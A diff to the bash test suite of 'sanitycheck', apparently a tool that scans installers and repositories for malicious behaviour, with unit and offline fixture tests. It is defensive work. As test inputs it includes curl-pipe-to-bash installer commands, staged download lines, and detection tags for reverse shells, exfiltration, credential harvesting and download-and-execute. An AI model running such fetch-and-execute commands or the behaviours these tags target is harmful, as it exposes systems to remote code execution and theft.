@@ -1,173 +1,128 @@
 #!/usr/bin/env bash
-set -euo pipefail
+# sanitycheck test suite. Unit-tests pure functions (sourced individually, the
+# main script is not run) plus integration tests over inert fixtures. Offline and
+# deterministic: no network, no LLM, fixtures never execute (dangerous lines are
+# quoted strings or behind SystemExit guards).
+set -uo pipefail
 
-PASS=0
-FAIL=0
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+SC="$HERE/sanitycheck.sh"
+FIX="$HERE/tests"
+if [[ -t 1 ]]; then G=$'\033[32m' R=$'\033[31m' Z=$'\033[0m'; else G='' R='' Z=''; fi
+fails=0
+pass() { printf '  %sPASS%s  %s\n' "$G" "$Z" "$1"; }
+fail() { printf '  %sFAIL%s  %s\n' "$R" "$Z" "$1"; fails=$((fails+1)); }
+eq()   { [[ "$2" == "$3" ]] && pass "$1" || fail "$1 (want '$3' got '$2')"; }
 
-pass() { PASS=$((PASS + 1)); printf '  \033[32mpass\033[0m %s\n' "$1"; }
-fail() { FAIL=$((FAIL + 1)); printf '  \033[31mFAIL\033[0m %s\n' "$1"; }
+# --- unit: source individual functions without running main -------------------
+eval "$(sed -n '/^extract_url()/,/^}/p'         "$SC")"
+eval "$(sed -n '/^classify_input()/,/^}/p'      "$SC")"
+eval "$(sed -n '/^sev_rank()/,/^}/p'            "$SC")"
+eval "$(sed -n '/^more_severe()/,/^}/p'         "$SC")"
+eval "$(sed -n '/^demote_for_installer()/,/^}/p' "$SC")"
+eval "$(sed -n '/^parse_llm()/,/^}/p' "$SC")"
 
-assert_eq() {
-  local label="$1" expected="$2" actual="$3"
-  if [[ "$expected" == "$actual" ]]; then
-    pass "$label"
-  else
-    fail "$label (expected '$expected', got '$actual')"
-  fi
+echo "unit: parse_llm (LLM response parsing)"
+parse_llm 'sure: {"verdict":"dangerous","summary":"drops a RAT","warnings":["revshell"]} done'
+eq "verdict parsed" "$LLM_VERDICT" "DANGEROUS"
+eq "summary parsed" "$LLM_SUMMARY" "drops a RAT"
+
+eval "$(sed -n '/^extract_fetch_urls()/,/^}/p' "$SC")"
+echo "unit: extract_fetch_urls (staged-download URL extraction)"
+utf=$(mktemp)
+printf 'curl -fsSL https://a.example/s2.sh -o /tmp/x\nwget http://b.example/p.bin\necho see https://not-fetched.example/docs\n' > "$utf"
+uurls="$(extract_fetch_urls "$utf")"
+[[ "$uurls" == *"https://a.example/s2.sh"* ]] && pass "extracts curl download URL" || fail "curl url"
+[[ "$uurls" == *"http://b.example/p.bin"* ]] && pass "extracts wget download URL" || fail "wget url"
+[[ "$uurls" != *"not-fetched"* ]] && pass "ignores non-download URL" || fail "over-extracts"
+rm -f "$utf"
+
+echo "unit: classify_input"
+eq "dir -> repo"                "$(classify_input "$FIX/benign-poc")" "repo"
+eq ".py file -> file"           "$(classify_input "$FIX/caution-poc/poc.py")" "file"
+eq "curl|bash cmd -> installer" "$(classify_input 'curl -fsSL https://x.io/i.sh | bash')" "installer"
+eq "script URL -> installer"    "$(classify_input 'https://x.io/install.sh')" "installer"
+eq "git URL -> repo"            "$(classify_input 'https://github.com/u/repo.git')" "repo"
+eq "github repo URL -> repo"    "$(classify_input 'https://github.com/u/repo')" "repo"
+eq "raw .sh URL -> installer"   "$(classify_input 'https://raw.githubusercontent.com/u/r/main/install.sh')" "installer"
+
+echo "unit: extract_url"
+eq "url from curl cmd" "$(extract_url 'curl -fsSL https://x.io/i.sh | bash')" "https://x.io/i.sh"
+
+echo "unit: more_severe"
+eq "DANGEROUS beats CAUTION" "$(more_severe CAUTION DANGEROUS)" "DANGEROUS"
+eq "CAUTION beats SAFE"      "$(more_severe SAFE CAUTION)" "CAUTION"
+
+echo "unit: demote_for_installer (anti-cry-wolf)"
+MODE=installer
+eq "persistence demoted to LOW"   "$(demote_for_installer persistence MED)" "LOW"
+eq "download-exec HIGH -> MED"    "$(demote_for_installer download-exec HIGH)" "MED"
+eq "reverse-shell stays HIGH"     "$(demote_for_installer reverse-shell HIGH)" "HIGH"
+MODE=repo
+eq "no demotion in repo mode"     "$(demote_for_installer persistence MED)" "MED"
+
+# --- integration: fixtures (offline, no LLM) ---------------------------------
+scan() { # dir [flags...]
+  local dir="$1"; shift
+  local json; json="$("$SC" --offline "$@" --json "$FIX/$dir" 2>/dev/null)"
+  "$SC" --offline "$@" "$FIX/$dir" >/dev/null 2>&1; EXIT=$?
+  VERDICT="$(printf '%s' "$json" | python3 -c 'import json,sys;print(json.load(sys.stdin)["verdict"])' 2>/dev/null)"
+  TAGS=" $(printf '%s' "$json" | python3 -c 'import json,sys;print(" ".join(sorted({f["tag"] for f in json.load(sys.stdin)["findings"]})))' 2>/dev/null) "
 }
+has() { [[ "$TAGS" == *" $1 "* ]] && pass "detects $1" || fail "missing tag $1"; }
 
-assert_exit() {
-  local label="$1" expected="$2"; shift 2
-  local rc=0
-  "$@" >/dev/null 2>&1 || rc=$?
-  assert_eq "$label" "$expected" "$rc"
-}
+echo "integration: benign-poc -> SAFE"
+scan benign-poc;   eq "verdict" "$VERDICT" "SAFE"; eq "exit" "$EXIT" "0"
 
-# ---------------------------------------------------------------------------
-# Source just the functions we need (without running main script)
-# ---------------------------------------------------------------------------
+echo "integration: benign-npm -> not DANGEROUS (legit node-gyp postinstall = MED, not a dropper)"
+scan benign-npm
+[[ "$VERDICT" != "DANGEROUS" ]] && pass "benign npm is not DANGEROUS ($VERDICT)" || fail "benign npm FP: DANGEROUS"
+expect_no_tag() { [[ "$TAGS" != *" $1 "* ]] && pass "no $1" || fail "unexpected $1"; }
+expect_no_tag npm-script-exec
 
-# extract_url
-eval "$(sed -n '/^extract_url()/,/^}/p' "$SCRIPT_DIR/sanitycheck.sh")"
+echo "integration: chocopoc-lookalike -> DANGEROUS"
+scan chocopoc-lookalike; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
+for t in import-shadow ioc-pkg ioc-str native-load env-gating pth-exec harvest sni-front doh; do has "$t"; done
 
-# parse_json
-eval "$(sed -n '/^parse_json()/,/^}/p' "$SCRIPT_DIR/sanitycheck.sh")"
+echo "integration: generic-malware -> DANGEROUS"
+scan generic-malware; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
+for t in reverse-shell download-exec destructive win-lolbin exfil-channel; do has "$t"; done
 
-# json_escape
-eval "$(sed -n '/^json_escape()/,/^}/p' "$SCRIPT_DIR/sanitycheck.sh")"
+echo "integration: deep-triggers -> DANGEROUS (Python deep-pass)"
+scan deep-triggers; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
+for t in typosquat ast-install-exec ast-decode-exec entropy-blob; do has "$t"; done
 
-# ---------------------------------------------------------------------------
-printf 'extract_url\n'
-# ---------------------------------------------------------------------------
+echo "integration: dev-targeting -> DANGEROUS (editor/IDE/CI autorun + Trojan Source)"
+scan dev-targeting; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
+for t in ide-autorun direnv conftest-exec py-startup-hook npm-install-script npm-script-exec trojan-source; do has "$t"; done
 
-assert_eq "bare https URL" \
-  "https://example.com/install.sh" \
-  "$(extract_url "https://example.com/install.sh")"
+echo "integration: evasion -> DANGEROUS (obfuscation/normalization variants still caught)"
+scan evasion; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
+for t in reverse-shell ioc-pkg typosquat import-shadow trojan-source win-lolbin; do has "$t"; done
 
-assert_eq "bare http URL" \
-  "http://example.com/install.sh" \
-  "$(extract_url "http://example.com/install.sh")"
+echo "hook: git/pip/npm wrappers"
+htmp=$(mktemp -d); fbin=$(mktemp -d); wrapd=$(mktemp -d)
+# offline wrapper so the hook scans stay fast/deterministic in the test (real
+# hooks run with network resolve on)
+printf '#!/bin/sh\nexec "%s" --offline "$@"\n' "$SC" > "$wrapd/sc"; chmod +x "$wrapd/sc"
+cp "$FIX/dev-targeting/package.json" "$htmp/package.json"   # known-DANGEROUS npm project
+printf '#!/bin/sh\necho REAL_RAN\n' > "$fbin/npm"; cp "$fbin/npm" "$fbin/pip3"; chmod +x "$fbin/npm" "$fbin/pip3"
+henv=(SANITYCHECK_BIN="$wrapd/sc" SANITYCHECK_HOOK=1 SANITYCHECK_HOOK_STRICT=1)
+nout=$(cd "$htmp" && PATH="$fbin:$PATH" env "${henv[@]}" bash -c "source '$HERE/hooks/sanitycheck.zsh'; npm install 2>&1" </dev/null)
+[[ "$nout" == *"npm install aborted"* && "$nout" != *REAL_RAN* ]] && pass "npm install aborts + blocks real npm" || fail "npm wrapper"
+pout=$(PATH="$fbin:$PATH" env "${henv[@]}" bash -c "source '$HERE/hooks/sanitycheck.zsh'; pip3 install '$FIX/chocopoc-lookalike' 2>&1" </dev/null)
+[[ "$pout" == *"install aborted"* && "$pout" != *REAL_RAN* ]] && pass "pip3 install aborts + blocks real pip" || fail "pip wrapper"
+gsrc=$(mktemp -d); gdstp=$(mktemp -d); cp -R "$FIX/chocopoc-lookalike/." "$gsrc/"
+( cd "$gsrc" && git init -q && git add -A && git -c commit.gpgsign=false \
+    -c user.email=a@b -c user.name=a commit -qm x --no-verify ) >/dev/null 2>&1
+gout=$(env SANITYCHECK_BIN="$wrapd/sc" SANITYCHECK_HOOK=1 bash -c "source '$HERE/hooks/sanitycheck.zsh'; git clone -q '$gsrc' '$gdstp/c' 2>&1" </dev/null)
+[[ "$gout" == *"scanning freshly cloned"* && "$gout" == *DANGEROUS* ]] && pass "git clone scans the checkout" || fail "git clone wrapper"
+rm -rf "$htmp" "$fbin" "$wrapd" "$gsrc" "$gdstp"
 
-assert_eq "curl pipe bash" \
-  "https://example.com/install.sh" \
-  "$(extract_url "curl -fsSL https://example.com/install.sh | bash")"
+echo "integration: caution-poc -> CAUTION + --strict exit codes"
+scan caution-poc; eq "verdict" "$VERDICT" "CAUTION"; eq "exit (default)" "$EXIT" "0"
+scan caution-poc --strict; eq "exit (--strict)" "$EXIT" "1"
 
-assert_eq "curl pipe sh" \
-  "https://example.com/install.sh" \
-  "$(extract_url "curl -fsSL https://example.com/install.sh | sh")"
-
-assert_eq "wget pipe bash" \
-  "https://example.com/install.sh" \
-  "$(extract_url "wget -qO- https://example.com/install.sh | bash")"
-
-assert_eq "curl pipe sudo bash" \
-  "https://example.com/install.sh" \
-  "$(extract_url "curl -fsSL https://example.com/install.sh | sudo bash")"
-
-assert_eq "bash -c \$(curl)" \
-  "https://example.com/install.sh" \
-  "$(extract_url 'bash -c "$(curl -fsSL https://example.com/install.sh)"')"
-
-assert_eq "bash process substitution" \
-  "https://example.com/install.sh" \
-  "$(extract_url "bash <(curl -fsSL https://example.com/install.sh)")"
-
-assert_eq "URL with path and query" \
-  "https://raw.githubusercontent.com/user/repo/main/install.sh?token=abc" \
-  "$(extract_url "curl -fsSL https://raw.githubusercontent.com/user/repo/main/install.sh?token=abc | bash")"
-
-assert_exit "no URL returns 1" 1 extract_url "no url here"
-assert_exit "empty string returns 1" 1 extract_url ""
-
-# ---------------------------------------------------------------------------
-printf '\nparse_json\n'
-# ---------------------------------------------------------------------------
-
-PARSED=$(printf '{"verdict":"SAFE","summary":"Installs foo.","warnings":[]}' | parse_json)
-assert_eq "SAFE verdict" "SAFE" "$(echo "$PARSED" | head -1)"
-assert_eq "SAFE summary" "Installs foo." "$(echo "$PARSED" | sed -n '2p')"
-assert_eq "SAFE no warnings" "" "$(echo "$PARSED" | grep '^W:' || true)"
-
-PARSED=$(printf '{"verdict":"CAUTION","summary":"Installs bar.","warnings":["telemetry","modifies cron"]}' | parse_json)
-assert_eq "CAUTION verdict" "CAUTION" "$(echo "$PARSED" | head -1)"
-assert_eq "CAUTION summary" "Installs bar." "$(echo "$PARSED" | sed -n '2p')"
-assert_eq "CAUTION warning count" "2" "$(echo "$PARSED" | grep -c '^W:' || true)"
-assert_eq "CAUTION warning 1" "W:telemetry" "$(echo "$PARSED" | grep '^W:' | head -1)"
-
-PARSED=$(printf '{"verdict":"DANGEROUS","summary":"Malware.","warnings":["steals keys","backdoor"]}' | parse_json)
-assert_eq "DANGEROUS verdict" "DANGEROUS" "$(echo "$PARSED" | head -1)"
-assert_eq "DANGEROUS warning count" "2" "$(echo "$PARSED" | grep -c '^W:' || true)"
-
-PARSED=$(printf 'this is not json' | parse_json)
-assert_eq "invalid JSON returns PARSE_ERROR" "PARSE_ERROR" "$(echo "$PARSED" | head -1)"
-
-PARSED=$(printf '{"summary":"no verdict field"}' | parse_json)
-assert_eq "missing verdict returns UNKNOWN" "UNKNOWN" "$(echo "$PARSED" | head -1)"
-
-# ---------------------------------------------------------------------------
-printf '\njson_escape\n'
-# ---------------------------------------------------------------------------
-
-assert_eq "simple string" \
-  '"hello world"' \
-  "$(printf 'hello world' | json_escape)"
-
-assert_eq "quotes escaped" \
-  '"say \"hi\""' \
-  "$(printf 'say "hi"' | json_escape)"
-
-assert_eq "newlines escaped" \
-  '"line1\nline2"' \
-  "$(printf 'line1\nline2' | json_escape)"
-
-assert_eq "backslash escaped" \
-  '"back\\slash"' \
-  "$(printf 'back\\slash' | json_escape)"
-
-# ---------------------------------------------------------------------------
-printf '\nprovider flags\n'
-# ---------------------------------------------------------------------------
-
-HELP_OUT=$(bash "$SCRIPT_DIR/sanitycheck.sh" --help 2>&1)
-if [[ "$HELP_OUT" == *"--provider"* ]]; then
-  pass "--provider in help"
-else
-  fail "--provider not in help output"
-fi
-if [[ "$HELP_OUT" == *"--model"* ]]; then
-  pass "--model in help"
-else
-  fail "--model not in help output"
-fi
-if [[ "$HELP_OUT" == *"SANITYCHECK_PROVIDER"* ]]; then
-  pass "SANITYCHECK_PROVIDER in help"
-else
-  fail "SANITYCHECK_PROVIDER not in help output"
-fi
-
-# ---------------------------------------------------------------------------
-printf '\nCLI flags\n'
-# ---------------------------------------------------------------------------
-
-assert_exit "--help exits 0" 0 bash "$SCRIPT_DIR/sanitycheck.sh" --help
-assert_exit "-h exits 0" 0 bash "$SCRIPT_DIR/sanitycheck.sh" -h
-assert_exit "no args exits 1" 1 bash "$SCRIPT_DIR/sanitycheck.sh"
-assert_exit "unknown flag exits 1" 1 bash "$SCRIPT_DIR/sanitycheck.sh" --bogus
-assert_exit "no URL in input exits 1" 1 bash "$SCRIPT_DIR/sanitycheck.sh" "just words"
-
-# ---------------------------------------------------------------------------
-printf '\ncolors\n'
-# ---------------------------------------------------------------------------
-
-# When not a tty, colors should be empty
-OUTPUT=$(bash "$SCRIPT_DIR/sanitycheck.sh" --help 2>&1 | cat -v)
-if [[ "$OUTPUT" != *$'\033'* ]]; then
-  pass "no escape codes when piped"
-else
-  fail "escape codes present when piped"
-fi
-
-# ---------------------------------------------------------------------------
-printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
-[[ "$FAIL" -eq 0 ]]
+echo
+if (( fails )); then printf '%sFAIL%s: %d check(s) failed\n' "$R" "$Z" "$fails"; exit 1; fi
+printf '%sPASS%s: all checks passed\n' "$G" "$Z"
